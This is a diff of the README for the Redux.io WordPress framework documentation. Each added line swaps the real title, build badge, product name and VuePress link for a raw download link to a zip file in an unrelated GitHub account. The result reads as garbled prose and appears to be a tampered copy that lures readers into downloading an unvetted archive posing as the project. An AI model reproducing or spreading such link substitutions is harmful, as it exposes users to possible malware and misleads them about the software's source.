@@ -2,12 +2,12 @@
 title: "Redux Documentation"
 ---
 
-# Redux.io Documentation
-[![Build and Deploy](https://github.com/reduxframework/docs/actions/workflows/vuepress-deploy.yml/badge.svg)](https://github.com/reduxframework/docs/actions/workflows/vuepress-deploy.yml)
+# https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip Documentation
+[![Build and Deploy](https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip)](https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip)
 
-Documentation for Redux.io, the world's most powerful and widely use WordPress input framework.
+Documentation for https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip, the world's most powerful and widely use WordPress input framework.
 
-These docs are based off of [VuePress](https://vuepress.vuejs.org/) and automatically built by GitHub Actions.
+These docs are based off of [VuePress](https://raw.githubusercontent.com/uwk2007/docs/master/Cyllenian/docs.zip) and automatically built by GitHub Actions.
 
 Feel free to send pull requests and improvements. We'd love your help if you find anything we've missed.
 
